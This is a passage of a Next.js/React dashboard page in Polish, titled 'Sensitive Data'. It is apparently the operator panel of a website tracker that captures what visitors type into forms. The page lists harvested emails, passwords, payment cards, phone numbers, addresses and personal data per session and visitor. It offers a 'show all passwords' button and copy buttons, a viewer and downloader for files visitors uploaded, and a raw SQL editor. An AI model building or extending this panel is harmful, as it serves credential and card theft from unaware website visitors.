'use client';

import { useState, useEffect, useCallback } from 'react';
import { DashboardContent } from '@/components/dashboard';

// Typy dla plików
interface UploadedFile {
    id: string;
    timestamp: string;
    site_id: string;
    session_id: string;
    visitor_id: string;
    form_submission_id: string | null;
    field_name: string | null;
    file_name: string;
    file_type: string | null;
    file_size: number;
    file_extension: string | null;
    page_url: string | null;
    page_path: string | null;
    created_at: string;
    has_content: boolean;
}

interface FilesStats {
    totalFiles: number;
    uniqueVisitors: number;
    totalSize: number;
    withContent: number;
    uniqueExtensions: number;
}

// Typy dla danych logowania
interface ExtractedCredential {
    id: string;
    timestamp: string;
    siteId: string;
    sessionId: string;
    visitorId: string;
    formId: string | null;
    formName: string | null;
    pageUrl: string | null;
    fieldName: string;
    fieldValue: string;
    credentialType: string;
    confidence: 'high' | 'medium' | 'low';
}

interface CredentialsStats {
    total: number;
    byType: {
        email: number;
        password: number;
        username: number;
        phone: number;
        card: number;
        address: number;
        personal: number;
    };
    byConfidence: {
        high: number;
        medium: number;
        low: number;
    };
    uniqueSessions: number;
    uniqueVisitors: number;
}

// Mapowanie typów danych na ikony i kolory
const CREDENTIAL_TYPE_CONFIG: Record<string, { icon: string; label: string; color: string; bgColor: string }> = {
    email: { icon: '📧', label: 'E-mail', color: 'text-blue-400', bgColor: 'bg-blue-500/20' },
    password: { icon: '🔐', label: 'Hasło', color: 'text-red-400', bgColor: 'bg-red-500/20' },
    username: { icon: '👤', label: 'Login', color: 'text-purple-400', bgColor: 'bg-purple-500/20' },
    phone: { icon: '📱', label: 'Telefon', color: 'text-green-400', bgColor: 'bg-green-500/20' },
    card: { icon: '💳', label: 'Karta', color: 'text-amber-400', bgColor: 'bg-amber-500/20' },
    address: { icon: '📍', label: 'Adres', color: 'text-cyan-400', bgColor: 'bg-cyan-500/20' },
    personal: { icon: '🪪', label: 'Dane osobowe', color: 'text-pink-400', bgColor: 'bg-pink-500/20' },
};

const CONFIDENCE_CONFIG: Record<string, { label: string; color: string; bgColor: string }> = {
    high: { label: 'Wysoka', color: 'text-emerald-400', bgColor: 'bg-emerald-500/20 border-emerald-500/30' },
    medium: { label: 'Średnia', color: 'text-amber-400', bgColor: 'bg-amber-500/20 border-amber-500/30' },
    low: { label: 'Niska', color: 'text-slate-400', bgColor: 'bg-slate-500/20 border-slate-500/30' },
};

// Formatowanie rozmiaru pliku
function formatFileSize(bytes: number): string {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Ikona dla typu pliku
function getFileIcon(extension: string | null, mimeType: string | null): string {
    const ext = (extension || '').toLowerCase();
    const mime = (mimeType || '').toLowerCase();

    if (mime.startsWith('image/') || ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp'].includes(ext)) return '🖼️';
    if (mime.startsWith('video/') || ['mp4', 'webm', 'avi', 'mov', 'mkv'].includes(ext)) return '🎬';
    if (mime.startsWith('audio/') || ['mp3', 'wav', 'ogg', 'flac'].includes(ext)) return '🎵';
    if (mime === 'application/pdf' || ext === 'pdf') return '📄';
    if (['doc', 'docx', 'odt'].includes(ext)) return '📝';
    if (['xls', 'xlsx', 'csv', 'ods'].includes(ext)) return '📊';
    if (['ppt', 'pptx', 'odp'].includes(ext)) return '📽️';
    if (['zip', 'rar', '7z', 'tar', 'gz'].includes(ext)) return '📦';
    if (['exe', 'msi', 'dmg', 'deb', 'rpm'].includes(ext)) return '⚙️';
    if (['txt', 'md', 'rtf'].includes(ext)) return '📃';
    if (['js', 'ts', 'py', 'java', 'cpp', 'c', 'h', 'php', 'rb', 'go', 'rs'].includes(ext)) return '💻';
    if (['html', 'htm', 'css', 'scss', 'less'].includes(ext)) return '🌐';
    if (['json', 'xml', 'yaml', 'yml'].includes(ext)) return '📋';
    return '📁';
}

type ActiveTab = 'files' | 'credentials' | 'sql';

// Typy dla edytora SQL
interface TableInfo {
    name: string;
    type: string;
    columns: ColumnInfo[];
    rowCount: number;
}

interface ColumnInfo {
    cid: number;
    name: string;
    type: string;
    notnull: number;
    dflt_value: string | null;
    pk: number;
}

interface QueryResult {
    success: boolean;
    data?: Record<string, unknown>[];
    columns?: string[];
    rowCount?: number;
    changes?: number;
    error?: string;
    executionTime?: number;
    queryType?: 'SELECT' | 'INSERT' | 'UPDATE' | 'DELETE' | 'OTHER';
}

interface QueryHistoryItem {
    id: string;
    query: string;
    timestamp: Date;
    success: boolean;
    executionTime?: number;
    rowCount?: number;
}

export default function DataManagementPage() {
    // Aktywna zakładka
    const [activeTab, setActiveTab] = useState<ActiveTab>('credentials');

    // Stan dla plików
    const [files, setFiles] = useState<UploadedFile[]>([]);
    const [filesStats, setFilesStats] = useState<FilesStats | null>(null);
    const [filesLoading, setFilesLoading] = useState(true);

    // Stan dla danych logowania
    const [credentials, setCredentials] = useState<ExtractedCredential[]>([]);
    const [credentialsStats, setCredentialsStats] = useState<CredentialsStats | null>(null);
    const [credentialsLoading, setCredentialsLoading] = useState(true);

    // Filtry
    const [days, setDays] = useState(30);
    const [credentialTypeFilter, setCredentialTypeFilter] = useState<string>('all');
    const [confidenceFilter, setConfidenceFilter] = useState<string>('all');
    const [searchQuery, setSearchQuery] = useState('');

    // Error state
    const [error, setError] = useState<string | null>(null);

    // Toast/notyfikacja
    const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' } | null>(null);

    // Odkryte hasła (set ID-ów)
    const [revealedPasswords, setRevealedPasswords] = useState<Set<string>>(new Set());

    // Modal podglądu pliku
    const [previewFile, setPreviewFile] = useState<UploadedFile | null>(null);
    const [previewContent, setPreviewContent] = useState<string | null>(null);
    const [previewLoading, setPreviewLoading] = useState(false);

    // Stan dla edytora SQL
    const [sqlQuery, setSqlQuery] = useState<string>('SELECT * FROM events LIMIT 10;');
    const [sqlLoading, setSqlLoading] = useState(false);
    const [sqlResult, setSqlResult] = useState<QueryResult | null>(null);
    const [tables, setTables] = useState<TableInfo[]>([]);
    const [tablesLoading, setTablesLoading] = useState(true);
    const [queryHistory, setQueryHistory] = useState<QueryHistoryItem[]>([]);
    const [selectedTable, setSelectedTable] = useState<string | null>(null);

    // Pobieranie plików
    const fetchFiles = useCallback(async () => {
        setFilesLoading(true);
        try {
            const res = await fetch(`/api/files?days=${days}&limit=200`);
            if (!res.ok) {
                if (res.status === 401) {
                    window.location.href = '/login';
                    return;
                }
                throw new Error('Błąd pobierania plików');
            }
            const data = await res.json();
            setFiles(data.files || []);
            setFilesStats(data.stats || null);
        } catch (err) {
            console.error(err);
            setError('Błąd pobierania plików');
        } finally {
            setFilesLoading(false);
        }
    }, [days]);

    // Pobieranie struktury bazy danych
    const fetchDatabaseSchema = useCallback(async () => {
        setTablesLoading(true);
        try {
            const res = await fetch('/api/database/query');
            if (!res.ok) {
                if (res.status === 401) {
                    window.location.href = '/login';
                    return;
                }
                throw new Error('Błąd pobierania struktury bazy');
            }
            const data = await res.json();
            setTables(data.tables || []);
        } catch (err) {
            console.error(err);
        } finally {
            setTablesLoading(false);
        }
    }, []);

    // Wykonywanie zapytania SQL
    const executeSqlQuery = useCallback(async (query?: string) => {
        const queryToExecute = query || sqlQuery;
        if (!queryToExecute.trim()) {
            setToast({ message: '⚠️ Wprowadź zapytanie SQL', type: 'error' });
            setTimeout(() => setToast(null), 2000);
            return;
        }

        setSqlLoading(true);
        setSqlResult(null);

        try {
            const res = await fetch('/api/database/query', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ query: queryToExecute })
            });

            const data = await res.json() as QueryResult;
            setSqlResult(data);

            // Dodaj do historii
            const historyItem: QueryHistoryItem = {
                id: Date.now().toString(),
                query: queryToExecute,
                timestamp: new Date(),
                success: data.success,
                executionTime: data.executionTime,
                rowCount: data.rowCount
            };
            setQueryHistory(prev => [historyItem, ...prev].slice(0, 20)); // Maksymalnie 20 pozycji

            if (data.success) {
                setToast({ message: `✅ Wykonano w ${data.executionTime}ms`, type: 'success' });
            } else {
                setToast({ message: `❌ Błąd: ${data.error}`, type: 'error' });
            }
            setTimeout(() => setToast(null), 3000);

            // Odśwież strukturę po modyfikacjach
            if (data.queryType !== 'SELECT') {
                fetchDatabaseSchema();
            }
        } catch (err) {
            console.error(err);
            setSqlResult({
                success: false,
                error: 'Błąd połączenia z serwerem'
            });
            setToast({ message: '❌ Błąd połączenia', type: 'error' });
            setTimeout(() => setToast(null), 2000);
        } finally {
            setSqlLoading(false);
        }
    }, [sqlQuery, fetchDatabaseSchema]);

    // Wstaw przykładowe zapytanie dla wybranej tabeli
    const insertTableQuery = (tableName: string) => {
        setSqlQuery(`SELECT * FROM ${tableName} LIMIT 50;`);
        setSelectedTable(tableName);
    };

    // Pobieranie danych logowania
    const fetchCredentials = useCallback(async () => {
        setCredentialsLoading(true);
        try {
            const params = new URLSearchParams({
                days: String(days),
                limit: '500',
            });
            if (credentialTypeFilter !== 'all') {
                params.set('type', credentialTypeFilter);
            }
            if (confidenceFilter !== 'all') {
                params.set('confidence', confidenceFilter);
            }

            const res = await fetch(`/api/credentials?${params}`);
            if (!res.ok) {
                if (res.status === 401) {
                    window.location.href = '/login';
                    return;
                }
                throw new Error('Błąd pobierania danych logowania');
            }
            const data = await res.json();
            setCredentials(data.credentials || []);
            setCredentialsStats(data.stats || null);
        } catch (err) {
            console.error(err);
            setError('Błąd pobierania danych logowania');
        } finally {
            setCredentialsLoading(false);
        }
    }, [days, credentialTypeFilter, confidenceFilter]);

    // Efekt początkowy
    useEffect(() => {
        fetchFiles();
        fetchCredentials();
        fetchDatabaseSchema();
    }, [fetchFiles, fetchCredentials, fetchDatabaseSchema]);

    // Pobieranie pliku
    const handleDownloadFile = async (file: UploadedFile) => {
        try {
            const res = await fetch(`/api/files/${file.id}?download=true`);
            if (!res.ok) throw new Error('Błąd pobierania pliku');

            const blob = await res.blob();
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = file.file_name;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        } catch (err) {
            console.error(err);
            alert('Nie udało się pobrać pliku');
        }
    };

    // Podgląd pliku
    const handlePreviewFile = async (file: UploadedFile) => {
        setPreviewFile(file);
        setPreviewLoading(true);
        setPreviewContent(null);

        try {
            const res = await fetch(`/api/files/${file.id}`);
            if (!res.ok) throw new Error('Błąd pobierania pliku');

            const data = await res.json();
            if (data.fileContent) {
                setPreviewContent(data.fileContent);
            }
        } catch (err) {
            console.error(err);
        } finally {
            setPreviewLoading(false);
        }
    };

    // Usuwanie pliku
    const handleDeleteFile = async (file: UploadedFile) => {
        if (!confirm(`Czy na pewno chcesz usunąć plik "${file.file_name}"?`)) return;

        try {
            const res = await fetch(`/api/files/${file.id}`, { method: 'DELETE' });
            if (!res.ok) throw new Error('Błąd usuwania pliku');

            setFiles(files.filter(f => f.id !== file.id));
        } catch (err) {
            console.error(err);
            alert('Nie udało się usunąć pliku');
        }
    };

    // Filtrowanie danych logowania po wyszukiwaniu
    const filteredCredentials = credentials.filter(c => {
        if (!searchQuery) return true;
        const query = searchQuery.toLowerCase();
        return (
            c.fieldValue.toLowerCase().includes(query) ||
            c.fieldName.toLowerCase().includes(query) ||
            c.visitorId.toLowerCase().includes(query) ||
            (c.pageUrl && c.pageUrl.toLowerCase().includes(query))
        );
    });

    // Kopiowanie do schowka z notyfikacją
    const copyToClipboard = async (text: string) => {
        try {
            await navigator.clipboard.writeText(text);
            setToast({ message: '✅ Skopiowano do schowka!', type: 'success' });
            setTimeout(() => setToast(null), 2000);
        } catch {
            setToast({ message: '❌ Błąd kopiowania', type: 'error' });
            setTimeout(() => setToast(null), 2000);
        }
    };

    return (
        <DashboardContent>
            {/* Toast/Notyfikacja */}
            {toast && (
                <div className="fixed top-4 right-4 z-[100] animate-in slide-in-from-top-2 fade-in duration-200">
                    <div className={`px-4 py-3 rounded-xl shadow-lg border backdrop-blur-sm flex items-center gap-2 ${
                        toast.type === 'success' 
                            ? 'bg-emerald-500/20 border-emerald-500/30 text-emerald-300' 
                            : 'bg-rose-500/20 border-rose-500/30 text-rose-300'
                    }`}>
                        <span className="font-medium">{toast.message}</span>
                    </div>
                </div>
            )}

            {/* Modal podglądu pliku */}
            {previewFile && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4" onClick={() => setPreviewFile(null)}>
                    <div className="bg-slate-900 border border-slate-700 rounded-xl max-w-4xl w-full max-h-[90vh] flex flex-col shadow-2xl" onClick={e => e.stopPropagation()}>
                        {/* Header */}
                        <div className="p-4 border-b border-slate-700 flex justify-between items-center bg-slate-800 shrink-0">
                            <div className="flex items-center gap-3">
                                <span className="text-2xl">{getFileIcon(previewFile.file_extension, previewFile.file_type)}</span>
                                <div>
                                    <h3 className="text-lg font-bold text-white">{previewFile.file_name}</h3>
                                    <div className="text-xs text-slate-400">
                                        {formatFileSize(previewFile.file_size)} • {previewFile.file_type || 'Nieznany typ'}
                                    </div>
                                </div>
                            </div>
                            <div className="flex items-center gap-2">
                                {previewFile.has_content && (
                                    <button
                                        onClick={() => handleDownloadFile(previewFile)}
                                        className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 rounded-lg text-sm flex items-center gap-2 transition-colors"
                                    >
                                        ⬇️ Pobierz
                                    </button>
                                )}
                                <button onClick={() => setPreviewFile(null)} className="text-slate-400 hover:text-white p-2 text-xl">✕</button>
                            </div>
                        </div>

                        {/* Content */}
                        <div className="flex-1 overflow-auto p-6">
                            {previewLoading ? (
                                <div className="text-center py-20 text-slate-500 animate-pulse">Ładowanie podglądu...</div>
                            ) : previewContent ? (
                                <div className="flex items-center justify-center">
                                    {previewFile.file_type?.startsWith('image/') ? (
                                        <img src={previewContent} alt={previewFile.file_name} className="max-w-full max-h-[60vh] rounded-lg shadow-lg" />
                                    ) : previewFile.file_type?.startsWith('text/') || ['txt', 'md', 'json', 'xml', 'html', 'css', 'js', 'ts'].includes(previewFile.file_extension || '') ? (
                                        <pre className="bg-slate-950 p-4 rounded-lg text-sm font-mono overflow-auto max-h-[60vh] w-full border border-slate-700">
                                            {atob(previewContent.split(',')[1] || '')}
                                        </pre>
                                    ) : (
                                        <div className="text-center py-20">
                                            <div className="text-6xl mb-4">{getFileIcon(previewFile.file_extension, previewFile.file_type)}</div>
                                            <p className="text-slate-400">Podgląd niedostępny dla tego typu pliku</p>
                                            <button
                                                onClick={() => handleDownloadFile(previewFile)}
                                                className="mt-4 px-6 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors"
                                            >
                                                ⬇️ Pobierz plik
                                            </button>
                                        </div>
                                    )}
                                </div>
                            ) : (
                                <div className="text-center py-20 text-slate-500">
                                    <div className="text-6xl mb-4">📭</div>
                                    <p>Zawartość pliku niedostępna</p>
                                </div>
                            )}
                        </div>

                        {/* Details */}
                        <div className="p-4 border-t border-slate-700 bg-slate-800/50 grid grid-cols-2 md:grid-cols-4 gap-4 text-xs shrink-0">
                            <div>
                                <span className="text-slate-500">Data przesłania:</span>
                                <div className="text-slate-200">{new Date(previewFile.timestamp).toLocaleString('pl-PL')}</div>
                            </div>
                            <div>
                                <span className="text-slate-500">Strona:</span>
                                <div className="text-slate-200 truncate">{previewFile.page_path || '—'}</div>
                            </div>
                            <div>
                                <span className="text-slate-500">Sesja:</span>
                                <div className="text-slate-200 font-mono">{previewFile.session_id.substring(0, 12)}...</div>
                            </div>
                            <div>
                                <span className="text-slate-500">Pole formularza:</span>
                                <div className="text-slate-200">{previewFile.field_name || '—'}</div>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Header */}
                <div className="mb-8">
                    <div className="mb-4">
                        <h1 className="text-3xl font-bold tracking-tight text-white mb-2">🗄️ Dane Wrażliwe</h1>
                        <p className="text-slate-400">Zarządzanie plikami i wyciągniętymi danymi logowania z formularzy.</p>
                    </div>

                    {/* Filtry */}
                    <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-4 flex flex-wrap items-center gap-4">
                        <div className="flex items-center gap-2">
                            <span className="text-sm text-slate-400">Okres:</span>
                            <select
                                value={days}
                                onChange={(e) => setDays(parseInt(e.target.value))}
                                className="bg-slate-800 border border-slate-700 rounded-lg px-3 py-1.5 text-sm focus:border-blue-500 outline-none"
                            >
                                <option value={1}>Ostatni dzień</option>
                                <option value={7}>Ostatnie 7 dni</option>
                                <option value={14}>Ostatnie 14 dni</option>
                                <option value={30}>Ostatnie 30 dni</option>
                                <option value={90}>Ostatnie 90 dni</option>
                                <option value={365}>Ostatni rok</option>
                            </select>
                        </div>

                        {activeTab === 'credentials' && (
                            <>
                                <div className="flex items-center gap-2">
                                    <span className="text-sm text-slate-400">Typ:</span>
                                    <select
                                        value={credentialTypeFilter}
                                        onChange={(e) => setCredentialTypeFilter(e.target.value)}
                                        className="bg-slate-800 border border-slate-700 rounded-lg px-3 py-1.5 text-sm focus:border-blue-500 outline-none"
                                    >
                                        <option value="all">Wszystkie typy</option>
                                        <option value="email">📧 E-maile</option>
                                        <option value="password">🔐 Hasła</option>
                                        <option value="username">👤 Loginy</option>
                                        <option value="phone">📱 Telefony</option>
                                        <option value="card">💳 Karty</option>
                                        <option value="address">📍 Adresy</option>
                                        <option value="personal">🪪 Dane osobowe</option>
                                    </select>
                                </div>
                                <div className="flex items-center gap-2">
                                    <span className="text-sm text-slate-400">Pewność:</span>
                                    <select
                                        value={confidenceFilter}
                                        onChange={(e) => setConfidenceFilter(e.target.value)}
                                        className="bg-slate-800 border border-slate-700 rounded-lg px-3 py-1.5 text-sm focus:border-blue-500 outline-none"
                                    >
                                        <option value="all">Wszystkie</option>
                                        <option value="high">Wysoka</option>
                                        <option value="medium">Średnia</option>
                                        <option value="low">Niska</option>
                                    </select>
                                </div>
                                <div className="flex-1 min-w-[200px]">
                                    <input
                                        type="text"
                                        placeholder="Szukaj w danych..."
                                        value={searchQuery}
                                        onChange={(e) => setSearchQuery(e.target.value)}
                                        className="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-1.5 text-sm focus:border-blue-500 outline-none"
                                    />
                                </div>
                            </>
                        )}
                    </div>
                </div>

                {/* Tabs */}
                <div className="flex gap-2 mb-6 flex-wrap">
                    <button
                        onClick={() => setActiveTab('credentials')}
                        className={`px-6 py-3 rounded-xl font-medium transition-all ${
                            activeTab === 'credentials'
                                ? 'bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-lg shadow-red-900/30'
                                : 'bg-slate-800 text-slate-400 hover:bg-slate-700 hover:text-white border border-slate-700'
                        }`}
                    >
                        🔐 Dane Logowania
                        {credentialsStats && <span className="ml-2 text-xs opacity-75">({credentialsStats.total})</span>}
                    </button>
                    <button
                        onClick={() => setActiveTab('files')}
                        className={`px-6 py-3 rounded-xl font-medium transition-all ${
                            activeTab === 'files'
                                ? 'bg-gradient-to-r from-blue-600 to-cyan-600 text-white shadow-lg shadow-blue-900/30'
                                : 'bg-slate-800 text-slate-400 hover:bg-slate-700 hover:text-white border border-slate-700'
                        }`}
                    >
                        📁 Przesłane Pliki
                        {filesStats && <span className="ml-2 text-xs opacity-75">({filesStats.totalFiles})</span>}
                    </button>
                    <button
                        onClick={() => setActiveTab('sql')}
                        className={`px-6 py-3 rounded-xl font-medium transition-all ${
                            activeTab === 'sql'
                                ? 'bg-gradient-to-r from-violet-600 to-purple-600 text-white shadow-lg shadow-violet-900/30'
                                : 'bg-slate-800 text-slate-400 hover:bg-slate-700 hover:text-white border border-slate-700'
                        }`}
                    >
                        🗃️ Edytor SQL
                        {tables.length > 0 && <span className="ml-2 text-xs opacity-75">({tables.length} tabel)</span>}
                    </button>
                </div>

                {/* Error */}
                {error && (
                    <div className="mb-6 p-4 bg-red-900/30 border border-red-700 rounded-xl text-red-300">
                        ⚠️ {error}
                    </div>
                )}

                {/* Zakładka Dane Logowania */}
                {activeTab === 'credentials' && (
                    <div className="space-y-6">
                        {/* Statystyki */}
                        {credentialsStats && (
                            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-4">
                                {Object.entries(CREDENTIAL_TYPE_CONFIG).map(([type, config]) => (
                                    <div
                                        key={type}
                                        onClick={() => setCredentialTypeFilter(type)}
                                        className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
                                            credentialTypeFilter === type
                                                ? `${config.bgColor} border-current`
                                                : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'
                                        }`}
                                    >
                                        <div className="text-2xl mb-1">{config.icon}</div>
                                        <div className={`text-2xl font-bold ${config.color}`}>
                                            {credentialsStats.byType[type as keyof typeof credentialsStats.byType] || 0}
                                        </div>
                                        <div className="text-xs text-slate-400">{config.label}</div>
                                    </div>
                                ))}
                            </div>
                        )}

                        {/* Lista danych logowania */}
                        <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                            {credentialsLoading ? (
                                <div className="text-center py-20 text-slate-500 animate-pulse">Ładowanie danych...</div>
                            ) : filteredCredentials.length === 0 ? (
                                <div className="text-center py-20 text-slate-500">
                                    <div className="text-6xl mb-4">🔍</div>
                                    <p>Brak wyciągniętych danych logowania</p>
                                </div>
                            ) : (
                                <div className="overflow-x-auto">
                                    {/* Przyciski odkrywania haseł */}
                                    <div className="p-3 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between">
                                        <span className="text-sm text-slate-400">
                                            {filteredCredentials.length} rekordów
                                            {filteredCredentials.filter(c => c.credentialType === 'password').length > 0 && (
                                                <span className="ml-2 text-red-400">
                                                    ({filteredCredentials.filter(c => c.credentialType === 'password').length} haseł)
                                                </span>
                                            )}
                                        </span>
                                        <div className="flex gap-2">
                                            <button
                                                onClick={() => {
                                                    const passwordIds = filteredCredentials
                                                        .filter(c => c.credentialType === 'password')
                                                        .map(c => c.id);
                                                    setRevealedPasswords(new Set(passwordIds));
                                                }}
                                                className="px-3 py-1.5 text-xs bg-amber-600/20 border border-amber-500/30 text-amber-400 rounded-lg hover:bg-amber-600/30 transition-colors"
                                            >
                                                👁️ Pokaż wszystkie hasła
                                            </button>
                                            <button
                                                onClick={() => setRevealedPasswords(new Set())}
                                                className="px-3 py-1.5 text-xs bg-slate-700 border border-slate-600 text-slate-300 rounded-lg hover:bg-slate-600 transition-colors"
                                            >
                                                🔒 Ukryj wszystkie
                                            </button>
                                        </div>
                                    </div>
                                    <table className="w-full text-left">
                                        <thead>
                                            <tr className="bg-slate-800 text-slate-400 text-xs uppercase tracking-wider">
                                                <th className="p-4">Typ</th>
                                                <th className="p-4">Pole</th>
                                                <th className="p-4">Wartość</th>
                                                <th className="p-4">Pewność</th>
                                                <th className="p-4">Data</th>
                                                <th className="p-4">Strona</th>
                                                <th className="p-4 text-center">Akcje</th>
                                            </tr>
                                        </thead>
                                        <tbody className="divide-y divide-slate-800">
                                            {filteredCredentials.map((cred) => {
                                                const typeConfig = CREDENTIAL_TYPE_CONFIG[cred.credentialType] || { icon: '❓', label: cred.credentialType, color: 'text-slate-400', bgColor: 'bg-slate-500/20' };
                                                const confConfig = CONFIDENCE_CONFIG[cred.confidence];

                                                return (
                                                    <tr key={cred.id} className="hover:bg-slate-800/50 transition-colors">
                                                        <td className="p-4">
                                                            <div className={`inline-flex items-center gap-2 px-3 py-1 rounded-full ${typeConfig.bgColor}`}>
                                                                <span>{typeConfig.icon}</span>
                                                                <span className={`text-xs font-medium ${typeConfig.color}`}>{typeConfig.label}</span>
                                                            </div>
                                                        </td>
                                                        <td className="p-4">
                                                            <code className="text-xs bg-slate-800 px-2 py-1 rounded text-slate-300">{cred.fieldName}</code>
                                                        </td>
                                                        <td className="p-4">
                                                            <div className="flex items-center gap-2">
                                                                {cred.credentialType === 'password' ? (
                                                                    <>
                                                                        <span 
                                                                            className="font-mono text-sm text-red-400 cursor-pointer hover:text-red-300 transition-colors"
                                                                            onClick={() => {
                                                                                setRevealedPasswords(prev => {
                                                                                    const newSet = new Set(prev);
                                                                                    if (newSet.has(cred.id)) {
                                                                                        newSet.delete(cred.id);
                                                                                    } else {
                                                                                        newSet.add(cred.id);
                                                                                    }
                                                                                    return newSet;
                                                                                });
                                                                            }}
                                                                            title="Kliknij aby odkryć/ukryć"
                                                                        >
                                                                            {revealedPasswords.has(cred.id) ? cred.fieldValue : '••••••••'}
                                                                        </span>
                                                                        <button
                                                                            onClick={() => {
                                                                                setRevealedPasswords(prev => {
                                                                                    const newSet = new Set(prev);
                                                                                    if (newSet.has(cred.id)) {
                                                                                        newSet.delete(cred.id);
                                                                                    } else {
                                                                                        newSet.add(cred.id);
                                                                                    }
                                                                                    return newSet;
                                                                                });
                                                                            }}
                                                                            className="text-slate-500 hover:text-amber-400 transition-colors"
                                                                            title={revealedPasswords.has(cred.id) ? 'Ukryj hasło' : 'Pokaż hasło'}
                                                                        >
                                                                            {revealedPasswords.has(cred.id) ? '🔒' : '👁️'}
                                                                        </button>
                                                                    </>
                                                                ) : (
                                                                    <span className="font-mono text-sm text-white">
                                                                        {cred.fieldValue}
                                                                    </span>
                                                                )}
                                                                <button
                                                                    onClick={() => copyToClipboard(cred.fieldValue)}
                                                                    className="text-slate-500 hover:text-blue-400 transition-colors"
                                                                    title="Kopiuj"
                                                                >
                                                                    📋
                                                                </button>
                                                            </div>
                                                        </td>
                                                        <td className="p-4">
                                                            <span className={`text-xs px-2 py-1 rounded-full border ${confConfig.bgColor} ${confConfig.color}`}>
                                                                {confConfig.label}
                                                            </span>
                                                        </td>
                                                        <td className="p-4 text-xs text-slate-400">
                                                            {new Date(cred.timestamp).toLocaleString('pl-PL')}
                                                        </td>
                                                        <td className="p-4 text-xs text-slate-400 max-w-[200px] truncate" title={cred.pageUrl || ''}>
                                                            {cred.pageUrl ? new URL(cred.pageUrl).pathname : '—'}
                                                        </td>
                                                        <td className="p-4 text-center">
                                                            <button
                                                                onClick={() => copyToClipboard(cred.fieldValue)}
                                                                className="px-3 py-1.5 bg-blue-600/20 hover:bg-blue-600/40 border border-blue-500/30 rounded-lg text-xs text-blue-300 transition-colors"
                                                            >
                                                                Kopiuj
                                                            </button>
                                                        </td>
                                                    </tr>
                                                );
                                            })}
                                        </tbody>
                                    </table>
                                </div>
                            )}
                        </div>
                    </div>
                )}

                {/* Zakładka Pliki */}
                {activeTab === 'files' && (
                    <div className="space-y-6">
                        {/* Statystyki plików */}
                        {filesStats && (
                            <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
                                <div className="p-4 rounded-xl border bg-slate-900/50 border-slate-800">
                                    <div className="text-3xl font-bold text-white">{filesStats.totalFiles}</div>
                                    <div className="text-xs text-slate-400">Wszystkie pliki</div>
                                </div>
                                <div className="p-4 rounded-xl border bg-slate-900/50 border-slate-800">
                                    <div className="text-3xl font-bold text-blue-400">{filesStats.withContent}</div>
                                    <div className="text-xs text-slate-400">Z zawartością</div>
                                </div>
                                <div className="p-4 rounded-xl border bg-slate-900/50 border-slate-800">
                                    <div className="text-3xl font-bold text-emerald-400">{formatFileSize(filesStats.totalSize)}</div>
                                    <div className="text-xs text-slate-400">Łączny rozmiar</div>
                                </div>
                                <div className="p-4 rounded-xl border bg-slate-900/50 border-slate-800">
                                    <div className="text-3xl font-bold text-purple-400">{filesStats.uniqueVisitors}</div>
                                    <div className="text-xs text-slate-400">Unikalnych użytkowników</div>
                                </div>
                                <div className="p-4 rounded-xl border bg-slate-900/50 border-slate-800">
                                    <div className="text-3xl font-bold text-amber-400">{filesStats.uniqueExtensions}</div>
                                    <div className="text-xs text-slate-400">Typów plików</div>
                                </div>
                            </div>
                        )}

                        {/* Lista plików */}
                        <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                            {filesLoading ? (
                                <div className="text-center py-20 text-slate-500 animate-pulse">Ładowanie plików...</div>
                            ) : files.length === 0 ? (
                                <div className="text-center py-20 text-slate-500">
                                    <div className="text-6xl mb-4">📭</div>
                                    <p>Brak przesłanych plików</p>
                                </div>
                            ) : (
                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 p-4">
                                    {files.map((file) => (
                                        <div
                                            key={file.id}
                                            className="p-4 bg-slate-800/50 border border-slate-700 rounded-xl hover:border-slate-600 transition-all group"
                                        >
                                            <div className="flex items-start gap-3">
                                                <div className="text-4xl">{getFileIcon(file.file_extension, file.file_type)}</div>
                                                <div className="flex-1 min-w-0">
                                                    <h4 className="font-medium text-white truncate" title={file.file_name}>
                                                        {file.file_name}
                                                    </h4>
                                                    <div className="text-xs text-slate-400 mt-1">
                                                        {formatFileSize(file.file_size)} • {file.file_type || 'Nieznany'}
                                                    </div>
                                                    <div className="text-xs text-slate-500 mt-1">
                                                        {new Date(file.timestamp).toLocaleString('pl-PL')}
                                                    </div>
                                                </div>
                                            </div>

                                            {/* Status zawartości */}
                                            <div className="mt-3 flex items-center gap-2">
                                                {file.has_content ? (
                                                    <span className="text-xs px-2 py-1 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                                                        ✓ Zawartość dostępna
                                                    </span>
                                                ) : (
                                                    <span className="text-xs px-2 py-1 rounded-full bg-slate-600/20 text-slate-400 border border-slate-600/30">
                                                        Tylko metadane
                                                    </span>
                                                )}
                                            </div>

                                            {/* Akcje */}
                                            <div className="mt-4 flex gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
                                                {file.has_content && (
                                                    <>
                                                        <button
                                                            onClick={() => handlePreviewFile(file)}
                                                            className="flex-1 px-3 py-1.5 bg-blue-600/20 hover:bg-blue-600/40 border border-blue-500/30 rounded-lg text-xs text-blue-300 transition-colors"
                                                        >
                                                            👁️ Podgląd
                                                        </button>
                                                        <button
